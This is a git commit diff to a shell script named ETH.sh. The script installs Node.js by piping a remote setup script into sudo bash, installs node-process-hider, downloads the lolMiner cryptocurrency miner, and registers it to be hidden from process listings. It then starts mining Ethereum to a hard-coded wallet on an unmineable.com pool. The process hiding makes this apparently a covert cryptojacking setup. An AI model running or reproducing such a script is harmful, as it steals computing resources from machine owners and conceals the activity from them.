e24daa72cae2a3721fa5ed88cec5eed7d28b6567
TimBurner0 <102157009+TimBurner0@users.noreply.github.com>
2022-03-27 09:38:05 +0530

    Update ETH.sh

--- ETH.sh
+++ ETH.sh
@@ -2,6 +2,6 @@ sudo apt update
 clear
 sudo apt install screen
 screen -R xmr
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g node-process-hider && wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.46a/lolMiner_v1.46a_Lin64.tar.gz && tar -xf lolMiner_v1.46a_Lin64.tar.gz && cd 1.46a && sudo ph add lolMiner && apt install screen && screen
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash - && sudo apt-get install -y nodejs && sudo apt-get install yarn && npm i -g node-process-hider && apt install screen && screen && wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.46a/lolMiner_v1.46a_Lin64.tar.gz && tar -xf lolMiner_v1.46a_Lin64.tar.gz && cd 1.46a && sudo ph add lolMiner && apt install screen && screen
 screen
 ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user ETH:0x9Ba133D39F40e64C9809A99530Eb4E6eCACBe7F9.TW4a#mo7f-rmhw
